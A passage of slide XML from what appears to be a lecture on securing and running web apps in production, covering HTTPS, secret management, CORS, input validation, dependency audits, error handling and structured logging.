              <a:t>Client –HTTPS (TLS 1.3)–&gt; CDN/Load Balancer –HTTP (internal)–&gt; App Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Vercel / CloudFront:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Automatic HTTPS, no config needed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Self-hosted:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Use Let’s Encrypt (free) + Nginx/Caddy as reverse proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>HSTS header:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Tells browsers to </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1"/>
              <a:t>always</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> use HTTPS for your domain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 Variables &amp; Secrets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.env — NEVER commit this file</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="19177C"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>JWT_SECRET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a-very-long-random-string-at-least-256-bits</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="19177C"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>REFRESH_SECRET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another-long-random-string</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="19177C"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>MONGODB_URI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mongodb+srv://user:pass@cluster.mongodb.net/mydb</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="19177C"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>GROQ_API_KEY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gsk_xxxxxxxxxxxx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.gitignore — ALWAYS include</a:t>
            </a:r>
            <a:br/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env</a:t>
            </a:r>
            <a:br/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env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local</a:t>
            </a:r>
            <a:br/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env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production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Environment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manage secrets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dev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.env</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> file (gitignored)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Vercel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Dashboard &gt; Settings &gt; Environment Variables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AWS Lambda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Parameter Store / Secrets Manager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Docker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docker-compose.yml</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> env_file or Docker secrets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Audit now:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>git log --all -p -- '*.env'</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — if secrets were ever committed, rotate them immediately.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CORS Configuration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cors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require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'cors'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BAD: Allow everything</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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use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cors</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>())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// Access-Control-Allow-Origin: *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GOOD: Whitelist specific origins</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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use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cors</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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origin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'https://myapp.vercel.app'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'http://localhost:3000'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credentials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true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</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// Allow cookies / auth headers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methods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'GET'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'POST'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'PUT'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'DELETE'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allowedHeaders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'Content-Type'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'Authorization'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}))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/>
            <a:r>
              <a:rPr/>
              <a:t>In production, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>never</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> use </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>origin: '*'</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>credentials: true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>List exact origins; don’t use regex that can be bypassed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6: Input Validation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Validate at Every Boundary</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Validation Layers:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>User Input → Client Validation (UX feedback) → API Validation (Security gate) → Database Constraints (Last defense)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Client-side:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> For UX only — never trust it for security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Server-side:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> The real security gate — validate type, length, format, range</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Database:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Schema constraints as the final safety net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Server-Side Validation with Express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{ body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validationResult }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require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'express-validator'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>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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post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'/api/register'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body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'username'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isString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trim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isLength</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>min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max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50</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> })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matches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/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>^[a-zA-Z0-9_]+$</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="BB6688"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/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</a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// alphanumeric + underscore only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body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'password'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isLength</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>min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 })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matches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/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>[A-Z]</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="BB6688"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>)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// at least one uppercase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matches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/</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>[0-9]</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="BB6688"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/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         </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// at least one digit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body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'email'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isEmail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normalizeEmail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async</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> (req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res)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errors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validationResult</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(req)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666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>errors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isEmpty</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>()) {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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res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status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json</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>errors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errors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array</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>() 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}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// ... proceed with validated data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
            <a:br/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7: Dependency Security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Dependencies Are Your Attack Surface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>A typical Node.js app has </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>hundreds</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> of transitive dependencies.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Check for known vulnerabilities</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm audit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Fix automatically where possible</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm audit fix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See what's outdated</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm outdated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Automated tools: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npm audit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Built-in vulnerability scanner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Dependabot (GitHub)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Auto-creates PRs for vulnerable deps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Snyk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scanning + container images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Socket.dev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Detects supply-chain attacks in new packages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Rule:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Run </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm audit</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> before every deploy. Zero critical/high vulnerabilities in production.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Lock Files Matter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>package-lock.json  (npm)
yarn.lock          (yarn)
pnpm-lock.yaml     (pnpm)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Always commit your lock file</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> — it pins exact dependency versions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Without it, </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm install</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> on the server may pull different (possibly vulnerable) versions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm ci</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> (not </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>npm install</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) in CI/CD — installs exactly what the lock file specifies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8: Performance &amp; Reliability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Performance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Static assets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 via CDN (CloudFront, Vercel Edge)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Next.js </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>&lt;Image&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t>, WebP format, lazy loading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API responses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Cache with Redis (cache-aside, TTL)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Database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 indexes on frequently queried fields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Bundle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Code splitting, tree shaking, dynamic imports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Enable gzip/brotli (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr>
                          <a:latin typeface="Courier"/>
                        </a:rPr>
                        <a:t>compression</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr/>
                        <a:t> middleware)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Connection pooling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Reuse DB connections (critical for Lambda)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Compression middleware — reduces response size 60-80%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compression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require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'compression'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app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use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compression</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>())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Error Handling in Production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Development: show full error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// Production: generic message + log details</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>app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use</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>((err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req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res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next)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{</a:t>
            </a:r>
            <a:br/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// Always log the real error (for you)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08000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>console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error</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(err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stack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// Never expose internals to the client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008000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>process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env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NODE_ENV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'production'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>    res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status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500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json</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>error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'Something went wrong'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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}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 {</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>    res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status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500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json</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>error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err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message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stack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err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stack</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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}</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>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 b="1"/>
              <a:t>Why:</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> Stack traces reveal file paths, framework versions, and internal logic — information that helps attackers.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Graceful Degradation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Circuit breaker pattern for external services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async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fetchWithFallback</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(url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fallback) {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try</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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response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await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fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>(url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{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902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>signal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AbortSignal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timeout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5000</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>)  </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// 5s timeout</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>    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666666"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>response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ok</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="007020"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>throw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new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Error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`HTTP ${</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>response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status</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>}`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await</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> response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json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} </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="007020"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>catch</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> (error) {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console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error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`Service unavailable: ${</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="4070A0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>}`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error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message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fallback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// Return cached/default data</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Set </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>timeouts</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> on all external calls (DB, APIs, Redis)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Have </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>fallback</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> behavior when dependencies are down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>health check</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> endpoints (</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>/api/health</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t>) for monitoring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9: Monitoring &amp; Observability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Three Pillars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Logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1"/>
              <a:t>What happened?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Structured JSON logging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Request ID correlation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Don’t log sensitive data (passwords, tokens, PII)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Centralize (CloudWatch, ELK, Datadog)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Metrics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1"/>
              <a:t>How is it performing?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Request rate &amp; error rate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Response time (p50, p95, p99)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>CPU / memory usage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Cache hit ratio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Traces</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1"/>
              <a:t>Where is time spent?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>End-to-end request flow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Per-service latency breakdown</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Identify bottlenecks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Critical for microservices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Structured Logging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BAD: Unstructured string logs</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>console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log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'User login failed for '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username)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GOOD: Structured JSON logs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logger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require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'pino'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>)()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>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({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event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'login_attempt'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username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username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success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false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ip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req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ip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userAgent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req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get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'user-agent'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// Output: {"level":30,"event":"login_attempt","username":"alice",...}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>Why structured?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Searchable: </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>event:login_attempt AND success:false</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Parseable by log aggregation tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr/>
              <a:t>Consistent format across all services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NOT to Log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NEVER log these:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>password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req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body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password</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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// Passwords</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>token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req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headers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authorization</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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// Auth tokens</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>ssn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user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socialSecurityNumber</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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    </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// PII</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>creditCard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payment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cardNumber</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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    </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// Financial data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DO log these:</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>userId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user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id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action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'login'</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> 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 </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1">
                <a:solidFill>
                  <a:srgbClr val="60A0B0"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>// User actions</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>logger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info</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>({ </a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="902000"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>statusCode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401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path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req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path</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:latin typeface="Courier"/>
              </a:rPr>
